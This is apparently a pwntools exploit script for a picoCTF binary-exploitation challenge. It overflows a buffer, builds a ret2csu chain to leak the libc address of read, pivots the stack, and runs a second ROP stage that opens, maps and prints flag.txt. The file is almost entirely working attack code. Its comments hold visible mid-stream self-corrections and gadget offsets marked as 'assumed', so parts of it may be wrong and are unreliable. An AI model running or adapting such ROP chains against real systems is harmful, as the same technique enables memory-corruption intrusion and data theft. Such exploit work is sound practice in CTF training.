from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0
leave_ret = 0x400b96 

def leak_read():
    # Payload 1
    # 1. Leak read
    # 2. Read stage 2 to heap
    # 3. Pivot stack to heap
    
    # Stack Pivot Address (Heap)
    heap_stack = 0x602500
    
    payload = b'A' * 32
    payload += b'B' * 8 
    
    # Chain 1: Write got_read
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    # Chain 2: Read(0, heap_stack, 0x500)
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_read) + p64(0) + p64(heap_stack) + p64(0x500)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    # Chain 3: Pivot
    # csu_call returns. We are at 'pop rbx, rbp...'.
    # We pop junk into rbx..r15.
    # We pop heap_stack into rbp.
    # ret -> leave_ret.
    # leave -> mov rsp, rbp (rsp=heap_stack); pop rbp (from heap_stack).
    # ret (from heap_stack+8).
    
    payload += p64(csu_pop) # Wait, csu_call ends with jump to 0x400bf6 (add rsp,8; pop...)
    # So we are already at pops.
    # But csu_call does NOT return to csu_pop!
    # csu_call (0x400be0) executes call.
    # Then moves to 0x400bed (add rbx, 1; cmp; jne).
    # Then 0x400bf6 (add rsp, 8).
    # Then 0x400bfa (pop ...).
    # Then ret.
    # So we just need to provide data for pops.
    
    # We chained using p64(csu_pop) as return address of previous block.
    # But here we don't need csu_pop again. We are falling through to it.
    # The 'J'*8 was for 'add rsp, 8'.
    # The data for pops follows.
    
    # Wait, previous logic:
    # payload += p64(csu_pop) ... p64(csu_call) ... b'J'*8 ... p64(next_addr)
    # This means 'next_addr' is return address.
    # csu_pop pops new values.
    
    # So for Chain 2, we provided args for Read.
    # After Read, it returns to...
    # We want it to return to leave_ret logic.
    # But we need to set RBP first.
    # So we return to csu_pop (to set RBP)?
    # Yes.
    
    payload += p64(csu_pop)
    payload += p64(0) # rbx
    payload += p64(heap_stack) # rbp (IMPORTANT)
    payload += p64(0) * 4 # r12-r15
    payload += p64(leave_ret) # ret -> leave_ret

    log.info("Sending Chain payload...")
    r.sendline(payload)
    
    r.recvuntil(b'/     /   \xc2\xb4\n')
    
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        log.success(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except Exception as e:
        log.error(f"Failed to receive leak: {e}")
        exit()

leaked_read = leak_read()

# Calculate Offsets
# 0ubuntu9 values
off_read_9 = 0x110fa0
off_open_9 = 0x110cc0
off_write_9 = 0x111040
off_mmap_9 = 0x11b890
off_pop_rdi_9 = 0x26b72
off_pop_rsi_9 = 0x27529
off_pop_rdx_9 = 0x11c1e1
off_pop_rcx_9 = 0x9f822
off_mov_r8_rax_9 = 0x156108
off_pop_rsp_9 = 0x6fbc

shift_func = 0x190
shift_gadget_low = 0
shift_gadget_high = 0x190

addr_open = leaked_read - off_read_9 - shift_func + off_open_9 + shift_func # cancels out
# Wait, base = leak - (read_9 + shift).
# addr = base + (off_9 + shift).
# addr = leak - read_9 - shift + off_9 + shift = leak - read_9 + off_9.
# So functions use diff of 9.
addr_open = leaked_read - off_read_9 + off_open_9
addr_write = leaked_read - off_read_9 + off_write_9
addr_mmap = leaked_read - off_read_9 + off_mmap_9
addr_read = leaked_read # Identity

# Gadgets
# Low offsets (pop rdi, rsi, rcx) assumed unshifted
gadget_pop_rdi = leaked_read - off_read_9 - shift_func + off_pop_rdi_9
gadget_pop_rsi = leaked_read - off_read_9 - shift_func + off_pop_rsi_9
gadget_pop_rcx = leaked_read - off_read_9 - shift_func + off_pop_rcx_9
# High offsets (pop rdx, mov r8) assumed shifted
gadget_pop_rdx = leaked_read - off_read_9 - shift_func + off_pop_rdx_9 + shift_gadget_high
gadget_mov_r8_rax = leaked_read - off_read_9 - shift_func + off_mov_r8_rax_9 + shift_gadget_high

# Stage 2 ROP (at 0x602500)
# Bytes 0-7: Popped into RBP by leave (junk)
# Bytes 8+: Executed via ret.

payload2 = b'J' * 8 # saved rbp

flag_str_loc = 0x602500 + 0x400

# 1. open(flag_str_loc, 0)
payload2 += p64(gadget_pop_rdi) + p64(flag_str_loc)
payload2 += p64(gadget_pop_rsi) + p64(0)
payload2 += p64(addr_open)

# 2. mov r8, rax
payload2 += p64(gadget_mov_r8_rax) + p64(0) # pop rbx

# 3. mmap(0x603000, 0x100, 3, 0x12, r8, 0)
payload2 += p64(gadget_pop_rdi) + p64(0x603000)
payload2 += p64(gadget_pop_rsi) + p64(0x100)
payload2 += p64(gadget_pop_rdx) + p64(3) + p64(0) # pop rdx, r12
payload2 += p64(gadget_pop_rcx) + p64(0x12) + p64(0) # pop rcx, rbx
payload2 += p64(addr_mmap)

# 4. write(1, 0x603000, 0x100)
payload2 += p64(gadget_pop_rdi) + p64(1)
payload2 += p64(gadget_pop_rsi) + p64(0x603000)
payload2 += p64(gadget_pop_rdx) + p64(0x100) + p64(0) 
payload2 += p64(addr_write)

# Padding
payload2 = payload2.ljust(0x400, b'\x90')
payload2 += b'flag.txt\x00'

log.info("Sending Stage 2 payload...")
time.sleep(0.5)
r.sendline(payload2)

r.interactive()
